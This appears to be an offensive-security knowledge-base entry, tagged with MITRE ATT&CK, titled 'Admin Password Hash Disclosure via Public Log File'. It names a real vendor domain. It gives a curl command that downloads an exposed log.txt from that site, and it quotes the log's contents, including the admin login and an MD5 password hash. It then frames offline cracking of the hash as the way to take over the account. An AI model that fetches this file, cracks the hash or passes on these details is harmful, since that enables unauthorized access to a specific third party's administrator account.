---
id: acronis-log-disclosure-1121972
tags:
  - information-disclosure
  - credential-access
  - md5-hash
  - log-exposure
type: attack_chain
tools: []
tactics:
  - '[[Credential Access]]'
verified: false
platforms:
  - Web
submitted: true
complexity: low
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Extract-Admin-Credentials-from-Exposed-Log-File]]'
step_count: 1
techniques:
  - '[[Credentials In Files]]'
updated_at: '2025-12-14T17:30:07.433Z'
description: >-
  A simple information disclosure attack where a publicly accessible log file
  reveals the MD5 hash of the admin password, enabling potential account
  takeover through hash cracking.
skill_level: beginner
impact_level: high
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Credentials In Files]]'
---
# Admin Password Hash Disclosure via Public Log File

Multi-stage attack chain demonstrating a complete attack workflow.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~1 minute |
| Skill Level | Beginner |
| Complexity | Low |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Discovery of Exposed Log] --> B[Credential Extraction]
    B --> C[Potential Account Takeover]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (browser or basic HTTP client sufficient)

### Target Environment

- Web platform with PHP-based application
- Publicly accessible web server
- No authentication required for log file access

### Initial Access Requirements

- Internet access to the target URL
- No prior credentials or network position needed

## Detailed Attack Procedures

### Step 1: Access Exposed Log File
procedure: [[procedures/Extract-Admin-Credentials-from-Exposed-Log-File]]

**Objective**: Retrieve the log file containing sensitive admin credentials and MD5 password hash to enable further cracking and potential takeover.

**Instructions**: Directly navigate to or fetch the publicly accessible log file URL using a browser or HTTP client. For automated verification, use [[commands/curl-fetch-log]] to download the content:

```bash
curl https://www.devicelock.com/log.txt -o log.txt
```

Inspect the downloaded file for log entries revealing the admin login and MD5 hash.

**Expected Output**: A text file containing log data, such as: '2020-03-20 08:12:15 - main - <br>Module: change password (4.1.2)<br>change_password=yes;/forum/forum_auth.php;login=admin;md5=2bca2f877b7a727861b59f4a4039d2e9'

**Success Indicators**:
- Log file accessed without errors (HTTP 200)
- MD5 hash and admin login visible in the content
- No access controls blocking the request

## Attack Chain Summary

### Key Achievements

1. Identified and accessed a publicly exposed log file without authentication.
2. Extracted the admin username and MD5 password hash.
3. Enabled offline cracking of the hash for potential admin account compromise.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Credentials In Files]]

### MITRE ATT&CK Tactics

- [[Credential Access]]

---
*Last updated: 2023-10-01T00:00:00Z*
